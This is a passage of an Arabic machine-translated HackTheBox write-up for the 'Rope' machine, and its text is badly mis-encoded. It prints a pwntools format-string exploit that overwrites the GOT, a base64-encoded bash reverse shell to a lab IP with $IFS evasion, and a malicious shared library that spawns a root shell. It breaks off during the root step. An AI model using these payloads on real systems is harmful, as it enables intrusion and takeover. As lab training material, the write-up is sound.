<!doctype html>
<html class="no-js" lang="ar">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-13"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-13');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>โฌ๏ธ ๐ง๐ฟ ๐ ูุงู ุฐุง ุจููุณ. ุญุจู ุชุฌูู. PWN. ุชูุณูู ุงูุณูุงุณู ู ROP ุจุงุณุชุฎุฏุงู pwntools ๐ฟ โน๐ฟ ๐คฐ๐พ</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="ุฃูุงุตู ูุดุฑ ุงูุญููู ุงููุฑุณูุฉ ูููุนุงูุฌุฉ ุงูุฅุถุงููุฉ ูู ูููุน HackTheBox . 
 
 ูู ูุฐู ุงูููุงูุฉ ุ ูุฌูุน ุงูุนุฏูุฏ ูู pwn ุ ูุงูุชู ุณูุญููุง ุจุงุณุชุฎุฏุงู pwntools. ุฃุนุชูุฏ ุฃูู ุณู...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://geek-week.github.io/index.html"></a>
    <div class="page-header-text">Get best of the week</div>
  </header>
  <section class="page js-page"><h1>ูุงู ุฐุง ุจููุณ. ุญุจู ุชุฌูู. PWN. ุชูุณูู ุงูุณูุงุณู ู ROP ุจุงุณุชุฎุฏุงู pwntools</h1><div class="post__body post__body_full">
      <div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/503414/"><div style="text-align:center;"><img src="https://habrastorage.org/webt/cl/ci/gs/clcigsntltvnbkltsfgppni4t0u.png" alt="ุตูุฑุฉ"></div><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุฃูุงุตู ูุดุฑ ุงูุญููู ุงููุฑุณูุฉ </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ูููุนุงูุฌุฉ ุงูุฅุถุงููุฉ</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> ูู ูููุน </font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=" rel="nofollow"><font style="vertical-align: inherit;">HackTheBox</font></a><font style="vertical-align: inherit;"> . </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูู ูุฐู ุงูููุงูุฉ ุ ูุฌูุน ุงูุนุฏูุฏ ูู pwn ุ ูุงูุชู ุณูุญููุง ุจุงุณุชุฎุฏุงู pwntools. </font><font style="vertical-align: inherit;">ุฃุนุชูุฏ ุฃูู ุณูููู ูููุฏูุง ูููุฑุงุก ุงูุฐูู ูุฏููู ุฃู ูุณุชูู ูู ุงููุนู ูู ูุฐุง ุงูููุถูุน. </font><font style="vertical-align: inherit;">ุฏุนูุง ูุฐูุจ ... </font></font><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุงูุงุชุตุงู ุจุงููุฎุชุจุฑ ุนุจุฑ VPN. </font><font style="vertical-align: inherit;">ูู ุงููุณุชุญุณู ุนุฏู ุงูุงุชุตุงู ูู ููุจููุชุฑ ุงูุนูู ุฃู ูู ูุถูู ุญูุซ ุชุชููุฑ ุงูุจูุงูุงุช ุงููููุฉ ุจุงููุณุจุฉ ูู ุ ุญูุซ ููุชูู ุจู ุงูุฃูุฑ ุนูู ุดุจูุฉ ุฎุงุตุฉ ูุน ุฃุดุฎุงุต ูุนุฑููู ุดูุฆูุง ูู ูุฌุงู ุฃูู ุงููุนูููุงุช :)</font></font><br>
<br>
<div class="spoiler" role="button" tabindex="0">
                        <b class="spoiler_title"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุงููุนูููุงุช ุงูุชูุธูููุฉ</font></font></b>
                        <div class="spoiler_text">      ,     ,   <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=" rel="nofollow">  Telegram</a>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=" rel="nofollow">    </a>   .    , ,    <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=" rel="nofollow">    </a>.<br>
<a name="habracut"></a><br>
      .          ,  -      ,      .<br>
</div>
                    </div><br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุฑูููู</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุญุชูู ูุฐุง ุงูุฌูุงุฒ ุนูู ุนููุงู IP 10.10.10.148 ุ ูุงูุฐู ุฃุถููู ุฅูู / etc / hosts.</font></font><br>
<br>
<pre><code class="plaintext hljs">10.10.10.148    rope.htb</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุฃููุงู ุ ูููู ุจูุณุญ ุงูููุงูุฐ ุงูููุชูุญุฉ. </font><font style="vertical-align: inherit;">ูุธุฑูุง ูุฃูู ูุณุชุบุฑู ููุชูุง ุทูููุงู ููุญุต ุฌููุน ุงูููุงูุฐ ุจุงุณุชุฎุฏุงู nmap ุ ุณุฃูุนู ุฐูู ุฃููุงู ูุน ูุงุณูุงู. </font><font style="vertical-align: inherit;">ูููู ุจูุณุญ ุฌููุน ููุงูุฐ TCP ู UDP ูู ูุงุฌูุฉ tun0 ุจุณุฑุนุฉ 500 ุญุฒูุฉ ูู ุงูุซุงููุฉ.</font></font><br>
<br>
<pre><code class="bash hljs">masscan -e tun0 -p1-65535,U:1-65535 10.10.10.148 --rate=500</code></pre><br>
<img src="https://habrastorage.org/webt/xf/d7/5k/xfd75kcmf_acjvyqtaprv-sc6bo.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุงูุขู ุ ููุญุตูู ุนูู ูุนูููุงุช ุฃูุซุฑ ุชูุตููุงู ุญูู ุงูุฎุฏูุงุช ุงูุชู ุชุนูู ุนูู ุงูููุงูุฐ ุ ุณูููู ุจุฅุฌุฑุงุก ูุณุญ ุถูุฆู ุจุงุณุชุฎุฏุงู ุงูุฎูุงุฑ -A.</font></font><br>
<br>
<pre><code class="bash hljs">nmap -A rope.htb -p22,9999</code></pre><br>
<img src="https://habrastorage.org/webt/sd/tk/c3/sdtkc3orydw9_76o6c3gwryhlhc.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูููู ุงููุถูู ุจุชุดุบูู SSH ูุฎุงุฏู ููุจ. </font><font style="vertical-align: inherit;">ุณููุดุฑ ุนูู ุงูููุจ ูุณูุชููู ุงุณุชูุงุฑุฉ ุชูููุถ. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/-h/zo/lz/-hzolzjpvg00y1l3v1y1mbnqpv8.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุนูุฏ ุนุฑุถ ูุณุญ ุงูุฏููู ุ ูุญุตู ุนูู ุฏููู ุบูุฑ ูููุฑุณ / (http: //rope.htb: 9999 //). </font></font><br>
<br>
<img src="https://habrastorage.org/webt/79/jd/ix/79jdixhqpjhqhs0rsdkqg-hpluc.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ููู ุงูุฏููู / opt / www ูุฌุฏ ุงูููู ุงููุงุจู ููุชูููุฐ - ูุฐุง ูู ุฎุงุฏู ุงูููุจ ุงูุฎุงุต ุจูุง.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/ey/qz/fj/eyqzfjlf98744atrwnzsj3wsjsk.png" alt="ุตูุฑุฉ"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">HTTPserver PWN</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูู ุจุชูุฒููู ูุดุงูุฏ ูุง ูู ุงูุญูุงูุฉ ูุน checkec. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ch/xe/hx/chxehxx1ao9zlo9pk1wbttlrif8.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุจุงูุชุงูู ุ ูุฏููุง ุชุทุจูู 32 ุจุช ูุน ุฌููุน ูุณุงุฆู ุงูุญูุงูุฉ ุงููุดุทุฉ ุ ููู:</font></font><br>
<br>
<ul>
<li> NX (not execute) โ  ,   ,  ,     (    )    ,  ,    ,    .          .</li>
<li>ASLR:      (libc),          libc.     ret2libc.</li>
<li>PIE:  ,   ASLR,   ,     .         .</li>
<li>Canary:   ,         ,   .    ,     .      .</li>
</ul><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุธุฑูุง ูุญูููุฉ ุฃูู ูููููุง ูุฑุงุกุฉ ุงููููุงุช ุนูู ุงูุฎุงุฏู ุ ูููููุง ูุฑุงุกุฉ ุฎุฑูุทุฉ ุงูุนูููุฉ ููุฐุง ุงูููู ุงููุงุจู ููุชูููุฐ. </font><font style="vertical-align: inherit;">ูุฐุง ุณูู ูุนุทููุง ุงูุฅุฌุงุจุฉ ุนูู ุงูุฃุณุฆูุฉ ุงูุชุงููุฉ:</font></font><br>
<br>
<ol>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ูุง ุงูุนููุงู ุงูุฐู ูุชู ุชูุฒูู ุงูุจุฑูุงูุฌ ุนูููุ</font></font></li>
<li><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ููู ุฃู ุนููุงู ูุชู ุชุญููู ุงูููุชุจุงุช ุงูุชู ุชุณุชุฎุฏููุงุ</font></font></li>
</ol><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูููุนู ุฐูู.</font></font><br>
<br>
<pre><code class="bash hljs">curl <span class="hljs-string">"http://rope.htb:9999//proc/self/maps"</span> -H <span class="hljs-string">'Range: bytes=0-100000'</span></code></pre><br>
<img src="https://habrastorage.org/webt/ex/gp/v4/exgpv4as7ucyftbf6qpqxglysbc.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุจุงูุชุงูู ุ ูุฏููุง ุนููุงูุงู: 0x56558000 ู f7ddc000. </font><font style="vertical-align: inherit;">ูู ุงูููุช ููุณู ุ ูุญุตู ุนูู ุงููุณุงุฑ ุฅูู ููุชุจุฉ libc ุงููุณุชุฎุฏูุฉ ุ ููููู ุจุชูุฒูููุง ุฃูุถูุง. </font><font style="vertical-align: inherit;">ุงูุขู ุ ูุน ุงูุฃุฎุฐ ูู ุงูุงุนุชุจุงุฑ ูู ุดูุก ููุฌูุฏ ุ ุณูููู ุจุฅูุดุงุก ูุงูุจ ุงุณุชุบูุงู.</font></font><br>
<br>
<pre><code class="python hljs"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
<span class="hljs-keyword">import</span> urllib
<span class="hljs-keyword">import</span> base64<font></font>
<font></font>
host = <span class="hljs-string">'rope.htb'</span>
port = <span class="hljs-number">9999</span><font></font>
<font></font>
context.arch = <span class="hljs-string">'i386'</span>
binary= ELF(<span class="hljs-string">'./httpserver'</span>)<font></font>
libc = ELF(<span class="hljs-string">'./libc-2.27.so'</span>)<font></font>
bin_base = <span class="hljs-number">0x56558000</span> 
libc_base = <span class="hljs-number">0xf7ddc000</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุงูุขู ุงูุชุญ ุงูููู ููุณู ูุชุญูููู ูู ุฃุฏุงุฉ ุชูููู ููุงุฆูุฉ ูู (ูุน ุฃุฏุงุฉ ูู ุงูุดูุฑุฉ). ุฃุณุชุฎุฏู IDA ูุน ูุฌููุนุฉ ูู ุงูููููุงุช ุงูุฅุถุงููุฉ ุ ููุจู ุงูุฏุฎูู ูู ุชุญููู ุนููู ุ ุฃูุถู ุงููุธุฑ ูู ูู ุดูุก ูููููู ุฌูุน ููููุงุช ุฅุถุงููุฉ ูุซุจุชุฉ. ูุงุญุฏุฉ ูู ุงูุนุฏูุฏ ูู ูุฐู ูู </font></font><a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;pto=aue&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=" rel="nofollow"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">LazyIDA</font></font></a><font style="vertical-align: inherit;"><font style="vertical-align: inherit;"> . ูุจุงููุณุจุฉ ูุทูุจ ุงูุจุญุซ "ูุณุญ ุณูุณูุฉ ุงูุชูุณูู vuln" ูุญุตู ุนูู ููุญุฉ ูุน ูุธุงุฆู ูุญุชููุฉ ุงูุถุนู. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/ab/85/3d/ab853dd56ri3loneyejkce4snvm.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูู ุชุฌุฑุจุฉ ุงุณุชุฎุฏุงู ูุฐุง ุงูุจุฑูุงูุฌ ุงููุณุงุนุฏ ุ ูุฌูุช ุงูุงูุชุจุงู ุนูู ุงูููุฑ ุฅูู ุงูุณุทุฑ ุงูุซุงูู (ูุนููุฉ ุชูุณููู). ููุชูู ุฅูู ููุงู ุงุณุชุฎุฏุงู ูุฐู ุงููุธููุฉ ููููู ุจูููุง. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/_7/iw/sg/_7iwsgc6cxf0rrpe3ruaoyolobi.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ููุชู ุชุฃููุฏ ุงูุชุฎูููุงุช ุ ููุชู ุชูุฑูุฑ ุงูุฎุท ุจุจุณุงุทุฉ ุฅูู ูุธููุฉ printf. ุฏุนูุง ููุชุดู ูุง ูู ูุฐู ุงูุณูุณูุฉ. ุฏุนูุง ูุฐูุจ ุฅูู ููุงู ุงูุงุณุชุฏุนุงุก ููุธููุฉ log_access.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/0n/vr/1q/0nvr1qtnll7c_hab2jrqo-5fvdm.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุฐูู ูุญู ููุชููู ุจุงููุนููุฉ ุงูุซุงูุซุฉ ุ ุงูุชู ูุงูุช ุชููุฒ ุงููุคุณุณุฉ ุงูุฏูููุฉ ููุชูููุฉ ูููู. </font><font style="vertical-align: inherit;">ููุง ูุญุตู ุนูู ุฅุฌุงุจุงุช ูุฌููุน ุงูุฃุณุฆูุฉ ุฅูุง ูู ุฎูุงู ุงููุธุฑ ุฅูู ุงูุฅุณูุงุฏุงุช ุงูุชุฑุงูููุฉ ููุฐุง ุงููุชุบูุฑ. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/_s/i9/78/_si978isulkh-jme2gznkjftp98.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุจุงูุชุงูู ุ ูุฐุง ูุคุดุฑ ุฅูู ุณูุณูุฉ - ุงุณู ุงูููู ุงูููุชูุญ ูููุฑุงุกุฉ. </font><font style="vertical-align: inherit;">ูุธุฑูุง ูุฃู ูุฐุง ุงููุชุบูุฑ ูู ูุชูุฌุฉ ุฏุงูุฉ parse_request () ุ ูุชู ูุชุญ ุงูููู ูููุฑุงุกุฉ ุ ูุงูุจุฑูุงูุฌ ุจุฃูููู ูู ุฎุงุฏู ููุจ ุ ูููููุง ุฃู ููุชุฑุถ ุฃู ูุฐู ูู ุงูุตูุญุฉ ุงููุทููุจุฉ ุนูู ุงูุฎุงุฏู.</font></font><br>
<br>
<pre><code class="bash hljs">curl http://127.0.0.1:9999/qwerty</code></pre><br>
<img src="https://habrastorage.org/webt/q9/xm/_z/q9xm_zyx9s78gbl0j8zzuf-mdns.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุฏุนููุง ูุชุญูู ูู ุซุบุฑุฉ ุณูุณูุฉ ุงูุชูุณูู.</font></font><br>
<br>
<pre><code class="bash hljs">curl http://127.0.0.1:9999/$(python -c <span class="hljs-string">'print("AAAA"+"%25p"*100)'</span>)</code></pre><br>
<img src="https://habrastorage.org/webt/cx/aq/73/cxaq731ejafj-dkjyg6kuliy1o0.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุบุฑุงูุฉ! </font><font style="vertical-align: inherit;">ุฏุนููุง ูุญุฏุฏ ุงูุฅุฒุงุญุฉ (ุนุฏุฏ ูุญุฏุฏุงุชูช p ุงูุชู ูุฌุจ ุฅุฑุณุงููุง ููุญุตูู ุนูู 0x41414141 - AAAA ูู ููุงูุฉ ุงูุฅุฎุฑุงุฌ). </font></font><br>
<br>
<img src="https://habrastorage.org/webt/2i/lm/xr/2ilmxraso--gzeo2jqfwhwdtvom.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุญุตู ุนูู 53. ุชุญูู ูู ุตุญุฉ ูู ุดูุก.</font></font><br>
<br>
<pre><code class="bash hljs">curl http://127.0.0.1:9999/$(python -c <span class="hljs-string">'print("AAAA"+"%25p"*53)'</span>)</code></pre><br>
<img src="https://habrastorage.org/webt/bl/dm/mg/bldmmgl809qsxgxdds44phkyqqi.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุง ูููููุง ุงูุญุตูู ุนูู ุตุฏูุฉ ูุญููุฉ ุ ูููู ูููููุง ุชูููุฐ ุฃูุฑ ุ ุนูู ุณุจูู ุงููุซุงู ุ ุฅููุงุก ูุฐููุฉ ุนูุณูุฉ:</font></font><br>
<br>
<pre><code class="bash hljs">bash -i &gt;&amp; /dev/tcp/10.10.15.60/4321 0&gt;&amp;1</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูููู ูุชุฌูุจ ุฃู ุฃุญุฑู ุบูุฑ ูุฑูุญุฉ ุ ุณูููู ุจุชุดููุฑูุง ูู base64 ุ ุซู ุณุชุจุฏู ููุงููุฉ shell ููุง ููู:</font></font><br>
<br>
<pre><code class="bash hljs"><span class="hljs-built_in">echo</span> โYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS42MC80MzIxIDA+JjEKโ | base64 -d | bash -i</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ููู ุงูููุงูุฉ ุ ุงุณุชุจุฏู ุฌููุน ุงููุณุงูุงุช ุจุจููุฉ $ IFS. </font><font style="vertical-align: inherit;">ูุญุตู ุนูู ุงูุฃูุฑ ุงูุฐู ุชุญุชุงุฌ ุฅูู ุชูููุฐู ููุญุตูู ุนูู ุงูุงุชุตุงู ุงูุฎููู.</font></font><br>
<br>
<pre><code class="bash hljs"><span class="hljs-built_in">echo</span><span class="hljs-variable">$IFS</span><span class="hljs-string">"YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNS42MC80MzIxIDA+JjEK"</span>|base64<span class="hljs-variable">$IFS</span>-d|bash<span class="hljs-variable">$IFS</span>-i</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุฏุนูุง ูุถูู ูุฐุง ุฅูู ุงูุฑูุฒ:</font></font><br>
<br>
<pre><code class="python hljs">offset = <span class="hljs-number">53</span>
cmd = <span class="hljs-string">'bash -i &gt;&amp; /dev/tcp/10.10.15.60/4321 0&gt;&amp;1'</span>
shell = <span class="hljs-string">'echo$IFS"{}"|base64$IFS-d|bash$IFS-i'</span>.format(base64.b64encode(cmd))</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุนูุฏ ุงูุขู ุฅูู ุณูุณูุฉ ุงูุชูุณูู ุงูุฎุงุตุฉ ุจูุง. </font><font style="vertical-align: inherit;">ุจูุง ุฃู putsf ูุณูู ุจุนุฏ printf () ุ ูููููุง ุฅุนุงุฏุฉ ูุชุงุจุฉ ุนููุงูู ูู GOT ุฅูู ุนููุงู ูุธููุฉ ุงููุธุงู ูู libc. </font><font style="vertical-align: inherit;">ุจูุถู pwntools ุ ูู ุงูุณูู ุฌุฏูุง ุงูููุงู ุจุฐูู. </font><font style="vertical-align: inherit;">ุงูุชุฑุถ ุฃูู ููููู ุงูุญุตูู ุนูู ุงูุนููุงู ุงููุณุจู ููุธููุฉ puts ุจุงุณุชุฎุฏุงู binary.got ['puts] ุ ุจุณูููุฉ ุฃูุถูุง ูุน ูุธููุฉ ุงููุธุงู: libc.symbols [' system ']. </font><font style="vertical-align: inherit;">ุญูู ุฎุทูุท ุงูุชูุณูู ู GOT ุงูุชู ูุตูุชูุง ุจุงูุชูุตูู ูู ููุงูุงุช ุญูู pwn ุ ูุฐูู ููุง ูููู ุจุจุณุงุทุฉ ุจุฌูุน ุฎุท ุงูุชูุณูู ุจุงุณุชุฎุฏุงู pwntools:</font></font><br>
<br>
<pre><code class="python hljs">writes = {(elf_base + binary.got[<span class="hljs-string">'puts'</span>]): (libc_base + libc.symbols[<span class="hljs-string">'system'</span>])}<font></font>
format_string = fmtstr_payload(offset, writes)</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูููู ุจุฌูุน ุงูุญูููุฉ ุงูููุงุฆูุฉ:</font></font><br>
<br>
<pre><code class="python hljs">payload = shell + <span class="hljs-string">" /"</span> + urllib.quote(format_string) + <span class="hljs-string">"\n\n"</span></code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูููู ุจุชูุตูู ูุฅุฑุณุงู:</font></font><br>
<br>
<pre><code class="python hljs">p = remote(host,port)<font></font>
p.send(payload)<font></font>
p.close()</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุจุฏู ุงูุฑูุฒ ุงููุงูู ูุซู ูุฐุง. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/j7/tm/sa/j7tmsavnfi1jrlznbhrnylk1j2k.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุฏุนูุง ูููุฐ ุงูุฑูุฒ ููุญุตู ุนูู ุงูุงุชุตุงู ูุฑุฉ ุฃุฎุฑู.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/54/xz/ko/54xzkogf-qq9btyjx9frthjmb3q.png" alt="ุตูุฑุฉ"><br>
<br>
<img src="https://habrastorage.org/webt/of/_v/ku/of_vkulfppu97eeudtalu5ivxge.png" alt="ุตูุฑุฉ"><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุงููุณุชุนูู</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุฏุนููุง ูุชุญูู ูู ุฅุนุฏุงุฏุงุช sudo ูุชูููุฐ ุงูุฃูุงูุฑ ุจุฏูู ูููุฉ ูุฑูุฑ. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/5q/ai/0-/5qai0-4gkkxtn4o3vz9yk-pdu2o.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ููุฑู ุฃูู ููููู ุชูููุฐ ุนูููุงุช ุงููุฑุงุกุฉ ููุงุจุฉ ุนู ุงููุณุชุฎุฏู r4j. </font><font style="vertical-align: inherit;">ูุง ุชูุฌุฏ ููุงุท ุถุนู ูู ุงูุชุทุจูู ุ GTFOBins ุบุงุฆุจุฉ ุฃูุถูุง. </font><font style="vertical-align: inherit;">ุฏุนูุง ูุฑู ุงูููุชุจุงุช ุงูุชู ูุณุชุฎุฏููุง ุงูุชุทุจูู.</font></font><br>
<br>
<img src="https://habrastorage.org/webt/b-/3i/-s/b-3i-sn8hhevvo4ger7j8gaiy7k.png" alt="ุตูุฑุฉ"><br>
<br>
<pre><code class="bash hljs">ls -l /lib/x86_64-linux-gnu/ | grep <span class="hljs-string">"liblog.so\|libc.so.6"</span></code></pre><br>
<img src="https://habrastorage.org/webt/eb/4e/rr/eb4errgawf8imvy0xmy_hgd-gta.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุฃู ุฃูู ูููููุง ุงููุชุงุจุฉ ุฅูู ูุฐู ุงููููุงุช. </font><font style="vertical-align: inherit;">ูููุชุจ ููุชุจุชูุง.</font></font><br>
<br>
<pre><code class="cpp hljs"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;unistd.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sys/types.h&gt;</span></span>
<span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdlib.h&gt;</span></span><font></font>
<font></font>
<span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printlog</span><span class="hljs-params">()</span></span>{<font></font>
    setuid(<span class="hljs-number">0</span>);<font></font>
    setgid(<span class="hljs-number">0</span>);<font></font>
    system(<span class="hljs-string">"/bin/sh"</span>);<font></font>
}</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุงูุขู ุชุฌููุนูุง.</font></font><br>
<br>
<pre><code class="bash hljs">gcc -c -Wall -Werror -fpic liblog.c</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุฌูุน ุงูููุชุจุฉ.</font></font><br>
<br>
<pre><code class="bash hljs">Gcc -shared -o liblog.so liblog.o</code></pre><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุซู ูููู ุจุชุญููู ุงูููู ุฅูู ุงููุถูู ุ ููุณุชุจุฏู ุงูููุชุจุฉ ููููุฐ ุงูุจุฑูุงูุฌ. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/bk/n-/ci/bkn-ciaotw1id-emk87tv6anp1k.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุฐูู ูุฃุฎุฐ ุงููุณุชุฎุฏู.</font></font><br>
<br>
<h2><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">ุฌุฐุฑ</font></font></h2><br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูุณุฑุฏ ุงููุธุงู ูุณุชุฎุฏู linpeas. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/9k/nd/-k/9knd-k9gxwxz8hghzdwn7up8vbu.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ุฅุฐุงู ุนูู ุงููุถูู ุงููุญูู ุ ูุฅู ุงููููุฐ 1337 ูุณุชูุน. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/dz/xh/gs/dzxhgs3uf6d3jzmvdrfqpg0jsro.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ููุง ุชุฑู ุ ูุณุชุฎุฏููุง ุนุถู ูู ูุฌููุนุฉ adm. ุฏุนูุง ูููู ูุธุฑุฉ ุนูู ุงููููุงุช ุงููุชุงุญุฉ ููุฐู ุงููุฌููุนุฉ. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/39/jq/08/39jq08wmi0lzf8xb5b4hgkrwpay.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ููุงู ููู ูุซูุฑ ููุงูุชูุงู. ููุฐุง ูู ุงูุจุฑูุงูุฌ ุงูุฐู ูุณุชูุน ุนูู ุงููููุฐ. </font></font><br>
<br>
<img src="https://habrastorage.org/webt/u4/cf/up/u4cfuptixjubaydn3so9vv8iqnu.png" alt="ุตูุฑุฉ"><br>
<br><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">
ูู ูุฐู ุงูุญุงูุฉ ุ ูุนูู ุงูุชุทุจูู ูุฌุฐุฑ. </font></font><br>
<br>
